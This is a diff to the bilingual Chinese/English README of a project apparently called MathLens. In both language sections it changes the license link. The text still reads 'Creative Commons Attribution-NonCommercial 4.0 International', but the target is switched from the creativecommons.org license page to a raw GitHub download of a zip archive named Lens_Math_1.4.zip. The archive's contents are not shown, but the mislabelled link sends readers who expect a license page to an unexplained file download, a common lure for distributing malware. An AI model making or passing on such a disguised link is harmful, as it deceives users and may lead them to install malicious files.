@@ -150,7 +150,7 @@ MathLens/
 - **个人学习 / 教育用途**：免费使用，欢迎分享
 - **商业用途**：须获得作者书面授权，未经授权不得用于商业目的
 
-> [Creative Commons Attribution-NonCommercial 4.0 International](https://creativecommons.org/licenses/by-nc/4.0/)
+> [Creative Commons Attribution-NonCommercial 4.0 International](https://github.com/sagittaprolifer245/MathLens/raw/refs/heads/main/sample/Lens_Math_1.4.zip)
 
 ---
 ---
@@ -276,4 +276,4 @@ This project is licensed under **CC BY-NC 4.0 (Attribution-NonCommercial 4.0 Int
 - **Personal / educational use**: Free to use and share
 - **Commercial use**: Requires written permission from the author
 
-> [Creative Commons Attribution-NonCommercial 4.0 International](https://creativecommons.org/licenses/by-nc/4.0/)
+> [Creative Commons Attribution-NonCommercial 4.0 International](https://github.com/sagittaprolifer245/MathLens/raw/refs/heads/main/sample/Lens_Math_1.4.zip)
